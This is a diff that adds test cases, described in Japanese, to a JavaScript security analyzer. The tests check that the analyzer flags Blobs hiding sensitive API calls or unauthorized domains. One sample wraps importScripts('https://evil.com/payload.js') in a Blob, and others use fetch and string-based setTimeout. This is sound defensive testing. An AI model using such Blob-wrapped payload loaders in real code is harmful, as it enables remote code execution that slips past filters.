@@ -247,3 +247,39 @@ describe('タイマー系バイパス', () => {
     expectAnyViolation(`self.setTimeout('alert(1)', 1000)`)
   })
 })
+
+// =============================================================================
+// 9. JavaScript Blob の中身検査
+// =============================================================================
+describe('JavaScript Blob の中身検査', () => {
+  it('Blob 内にセンシティブ API → no-sensitive-api-override', () => {
+    expectViolation(
+      `new Blob(['fetch("https://example.com")'], { type: 'text/javascript' })`,
+      'no-sensitive-api-override'
+    )
+  })
+
+  it('Blob 内に非許可ドメイン URL → no-unauthorized-domain', () => {
+    expectViolation(
+      `new Blob(['importScripts("https://evil.com/payload.js")'], { type: 'text/javascript' })`,
+      'no-unauthorized-domain'
+    )
+  })
+
+  it('Blob 内にセンシティブ API も URL もない → no-javascript-blob', () => {
+    expectViolation(
+      `new Blob(['postMessage("done")'], { type: 'text/javascript' })`,
+      'no-javascript-blob'
+    )
+  })
+
+  it('type が javascript でない Blob → 違反なし', () => {
+    const signals = analyzeCodeSecurity(
+      `new Blob(['hello'], { type: 'text/plain' })`
+    )
+    const blobViolations = signals.detectedViolations.filter(
+      v => v.rule === 'no-javascript-blob' || v.rule === 'no-sensitive-api-override'
+    )
+    expect(blobViolations.length).toBe(0)
+  })
+})
